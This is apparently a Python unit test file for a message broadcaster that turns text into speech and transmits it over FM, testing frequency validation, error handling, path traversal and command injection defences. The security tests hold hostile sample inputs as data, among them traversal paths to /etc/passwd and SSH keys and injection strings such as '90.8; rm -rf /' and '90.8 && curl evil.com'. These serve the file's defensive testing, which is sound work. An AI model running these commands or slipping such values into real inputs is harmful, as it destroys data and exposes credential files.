"""
Unit tests for message_broadcaster.py

Tests cover:
- Path traversal protection
- Command injection protection
- Frequency validation
- Error handling
- Edge cases
"""

import unittest
import os
import tempfile
import shutil
from unittest.mock import patch, MagicMock, mock_open
from message_broadcaster import (
    PicnicMessageBroadcaster,
    BroadcastError,
    MessageFetchError,
    TTSBroadcastError
)


class TestPicnicMessageBroadcaster(unittest.TestCase):
    """Test suite for PicnicMessageBroadcaster"""

    def setUp(self):
        """Set up test fixtures"""
        self.test_token = "test_access_token_123"
        self.test_endpoint = "https://api.example.com/tts"
        self.test_api_key = "test_api_key_456"
        self.broadcaster = PicnicMessageBroadcaster(
            access_token=self.test_token,
            tts_endpoint=self.test_endpoint,
            s3_bucket="test-bucket",
            s3_prefix="test/",
            tts_api_key=self.test_api_key
        )

    def test_initialization(self):
        """Test broadcaster initialization"""
        self.assertEqual(self.broadcaster._access_token, self.test_token)
        self.assertEqual(self.broadcaster._tts_endpoint, self.test_endpoint)
        self.assertEqual(self.broadcaster._s3_bucket, "test-bucket")
        self.assertEqual(self.broadcaster._s3_prefix, "test/")
        self.assertEqual(self.broadcaster._tts_api_key, self.test_api_key)

    def test_initialization_strips_whitespace(self):
        """Test that initialization strips whitespace from config"""
        broadcaster = PicnicMessageBroadcaster(
            access_token="token",
            tts_endpoint="http://example.com",
            s3_bucket="  bucket-name  ",
            s3_prefix="  prefix/  ",
            tts_api_key="  api-key  "
        )
        self.assertEqual(broadcaster._s3_bucket, "bucket-name")
        self.assertEqual(broadcaster._s3_prefix, "prefix/")
        self.assertEqual(broadcaster._tts_api_key, "api-key")

    def test_no_tts_endpoint_raises_error(self):
        """Test that broadcasting without TTS endpoint raises error"""
        broadcaster = PicnicMessageBroadcaster(
            access_token="token",
            tts_endpoint="",  # Empty endpoint
            tts_api_key="key"
        )
        with self.assertRaises(TTSBroadcastError) as cm:
            broadcaster.broadcast_message("Test", "User", 90.8)
        self.assertIn("not configured", str(cm.exception))

    @patch('message_broadcaster.subprocess.run')
    @patch('message_broadcaster.boto3.client')
    @patch('message_broadcaster.os.path.exists', return_value=True)
    @patch('message_broadcaster.os.makedirs')
    @patch('message_broadcaster.PicnicMessageBroadcaster._make_request')
    def test_frequency_validation_rejects_invalid_frequency(
        self, mock_request, mock_makedirs, mock_exists, mock_boto3, mock_subprocess
    ):
        """Test that invalid frequencies are rejected"""
        # Mock TTS API response
        mock_request.return_value = {
            'body': '{"key": "test/audio.wav"}'
        }

        # Test invalid frequencies
        invalid_frequencies = [
            None,
            "invalid",
            -10.0,
            0.0,
            75.9,  # Below minimum
            108.1,  # Above maximum
            1000.0,
        ]

        for freq in invalid_frequencies:
            with self.assertRaises(TTSBroadcastError) as cm:
                self.broadcaster.broadcast_message("Test", "User", freq)
            self.assertIn("Invalid FM frequency", str(cm.exception))

    @patch('message_broadcaster.subprocess.run')
    @patch('message_broadcaster.boto3.client')
    @patch('message_broadcaster.os.path.exists', return_value=True)
    @patch('message_broadcaster.os.makedirs')
    @patch('message_broadcaster.PicnicMessageBroadcaster._make_request')
    def test_frequency_validation_accepts_valid_frequency(
        self, mock_request, mock_makedirs, mock_exists, mock_boto3, mock_subprocess
    ):
        """Test that valid frequencies are accepted"""
        # Mock TTS API response
        mock_request.return_value = {
            'body': '{"key": "test/audio.wav"}'
        }

        # Mock successful subprocess
        mock_subprocess.return_value = MagicMock(returncode=0)

        # Test valid frequencies
        valid_frequencies = [76.0, 90.8, 100.0, 108.0]

        for freq in valid_frequencies:
            try:
                self.broadcaster.broadcast_message("Test", "User", freq)
            except TTSBroadcastError as e:
                # Should not raise frequency validation error
                self.assertNotIn("Invalid FM frequency", str(e))

    @patch('message_broadcaster.subprocess.run')
    @patch('message_broadcaster.boto3.client')
    @patch('message_broadcaster.os.makedirs')
    @patch('message_broadcaster.PicnicMessageBroadcaster._make_request')
    def test_path_traversal_protection(
        self, mock_request, mock_makedirs, mock_boto3, mock_subprocess
    ):
        """Test protection against path traversal attacks"""
        # Mock TTS API with malicious S3 key
        malicious_keys = [
            "../../../etc/passwd",
            "../../../../../../root/.ssh/id_rsa",
            "test/../../sensitive_file",
            "",  # Empty filename
            ".",
            "..",
        ]

        mock_subprocess.return_value = MagicMock(returncode=0)

        for malicious_key in malicious_keys:
            mock_request.return_value = {
                'body': f'{{"key": "{malicious_key}"}}'
            }

            # Should either sanitize the filename or raise error
            # In our implementation, it generates a safe hash-based filename
            try:
                self.broadcaster.broadcast_message("Test", "User", 90.8)
                # If it succeeds, verify that the file path is safe
                # The implementation should use a hash-based filename
            except TTSBroadcastError:
                # It's also OK to raise an error for invalid paths
                pass

    @patch('message_broadcaster.subprocess.run')
    @patch('message_broadcaster.boto3.client')
    @patch('message_broadcaster.os.path.exists', return_value=True)
    @patch('message_broadcaster.os.makedirs')
    @patch('message_broadcaster.PicnicMessageBroadcaster._make_request')
    def test_command_injection_protection(
        self, mock_request, mock_makedirs, mock_exists, mock_boto3, mock_subprocess
    ):
        """Test that shell=False prevents command injection"""
        mock_request.return_value = {
            'body': '{"key": "test/audio.wav"}'
        }

        mock_subprocess.return_value = MagicMock(returncode=0)

        # Attempt broadcast
        self.broadcaster.broadcast_message("Test", "User", 90.8)

        # Verify subprocess.run was called with shell=False
        self.assertTrue(mock_subprocess.called)
        call_args = mock_subprocess.call_args

        # Check that shell=False was used
        self.assertIn('shell', call_args.kwargs)
        self.assertFalse(call_args.kwargs['shell'], "shell=True is a security vulnerability!")

        # Check that command is a list, not a string
        self.assertIsInstance(call_args.args[0], list, "Command should be a list, not a string")

    @patch('message_broadcaster.subprocess.run')
    @patch('message_broadcaster.boto3.client')
    @patch('message_broadcaster.os.path.exists', return_value=True)
    @patch('message_broadcaster.os.makedirs')
    @patch('message_broadcaster.PicnicMessageBroadcaster._make_request')
    def test_broadcast_uses_env_broadcast_cmd(
        self, mock_request, mock_makedirs, mock_exists, mock_boto3, mock_subprocess
    ):
        """Test that BROADCAST_CMD environment variable is used"""
        mock_request.return_value = {
            'body': '{"key": "test/audio.wav"}'
        }

        mock_subprocess.return_value = MagicMock(returncode=0)

        # Set custom BROADCAST_CMD
        with patch.dict(os.environ, {'BROADCAST_CMD': '/custom/pifm {file} {freq} 16000'}):
            self.broadcaster.broadcast_message("Test", "User", 91.5)

            # Verify the custom command was used
            self.assertTrue(mock_subprocess.called)
            call_args = mock_subprocess.call_args
            command_list = call_args.args[0]

            # Should contain '/custom/pifm'
            self.assertIn('/custom/pifm', command_list)

    @patch('message_broadcaster.PicnicMessageBroadcaster._make_request')
    def test_broadcast_handles_missing_s3_key(self, mock_request):
        """Test error handling when S3 key is missing from response"""
        # Mock response without 'key' field
        mock_request.return_value = {
            'body': '{"status": "success"}'
        }

        with self.assertRaises(TTSBroadcastError) as cm:
            self.broadcaster.broadcast_message("Test", "User", 90.8)
        self.assertIn("No S3 key found", str(cm.exception))

    @patch('message_broadcaster.subprocess.run')
    @patch('message_broadcaster.boto3.client')
    @patch('message_broadcaster.os.path.exists', return_value=True)
    @patch('message_broadcaster.os.makedirs')
    @patch('message_broadcaster.PicnicMessageBroadcaster._make_request')
    def test_broadcast_handles_subprocess_failure(
        self, mock_request, mock_makedirs, mock_exists, mock_boto3, mock_subprocess
    ):
        """Test error handling when broadcast subprocess fails"""
        mock_request.return_value = {
            'body': '{"key": "test/audio.wav"}'
        }

        # Mock failed subprocess
        mock_subprocess.return_value = MagicMock(
            returncode=1,
            stderr="Broadcast failed: device busy"
        )

        with self.assertRaises(TTSBroadcastError) as cm:
            self.broadcaster.broadcast_message("Test", "User", 90.8)
        self.assertIn("Broadcast command failed", str(cm.exception))

    @patch('message_broadcaster.boto3.client')
    @patch('message_broadcaster.os.path.exists', return_value=True)
    @patch('message_broadcaster.os.makedirs')
    @patch('message_broadcaster.PicnicMessageBroadcaster._make_request')
    def test_broadcast_handles_s3_download_failure(
        self, mock_request, mock_makedirs, mock_exists, mock_boto3
    ):
        """Test error handling when S3 download fails"""
        mock_request.return_value = {
            'body': '{"key": "test/audio.wav"}'
        }

        # Mock S3 client to raise error
        from botocore.exceptions import ClientError
        mock_s3 = MagicMock()
        mock_s3.download_file.side_effect = ClientError(
            {'Error': {'Code': '404', 'Message': 'Not Found'}},
            'download_file'
        )
        mock_boto3.return_value = mock_s3

        with self.assertRaises(TTSBroadcastError) as cm:
            self.broadcaster.broadcast_message("Test", "User", 90.8)
        self.assertIn("Failed to download audio from S3", str(cm.exception))

    def test_format_message_for_display(self):
        """Test message formatting for display"""
        message = {
            "user": {
                "first_name": "John",
                "last_name": "Doe"
            },
            "message": "Hello World",
            "created_at": "2025-01-15T14:30:00Z",
            "message_type": "text"
        }

        formatted = self.broadcaster.format_message_for_display(message)

        self.assertEqual(formatted["user_name"], "John Doe")
        self.assertEqual(formatted["message_text"], "Hello World")
        self.assertIn(":", formatted["display_text"])

    def test_format_message_handles_missing_user_data(self):
        """Test that message formatting handles missing user data"""
        message = {
            "message": "Test message",
            "created_at": "2025-01-15T14:30:00Z"
        }

        formatted = self.broadcaster.format_message_for_display(message)

        self.assertIn("Unknown", formatted["user_name"])

    @patch('message_broadcaster.urlopen')
    def test_make_request_includes_api_key_header(self, mock_urlopen):
        """Test that API key is included in request headers"""
        mock_response = MagicMock()
        mock_response.read.return_value = b'{"status": "ok"}'
        mock_urlopen.return_value.__enter__.return_value = mock_response

        # Make request
        result = self.broadcaster._make_request(
            "http://example.com/api",
            method="POST",
            data={"test": "data"},
            headers={"x-api-key": self.test_api_key}
        )

        # Verify request was made
        self.assertTrue(mock_urlopen.called)
        # Verify headers include API key
        request_obj = mock_urlopen.call_args.args[0]
        self.assertIn('x-api-key', request_obj.headers)


class TestSecurityValidation(unittest.TestCase):
    """Security-focused test cases"""

    def test_no_shell_injection_in_frequency(self):
        """Test that frequency parameter doesn't allow shell injection"""
        broadcaster = PicnicMessageBroadcaster(
            access_token="token",
            tts_endpoint="http://example.com",
            tts_api_key="key"
        )

        # These should all raise validation errors, not execute anything
        malicious_frequencies = [
            "90.8; rm -rf /",
            "90.8 && curl evil.com",
            "$(whoami)",
            "`rm -rf /`",
        ]

        for freq in malicious_frequencies:
            with self.assertRaises((TTSBroadcastError, TypeError, ValueError)):
                broadcaster.broadcast_message("Test", "User", freq)


if __name__ == '__main__':
    unittest.main()
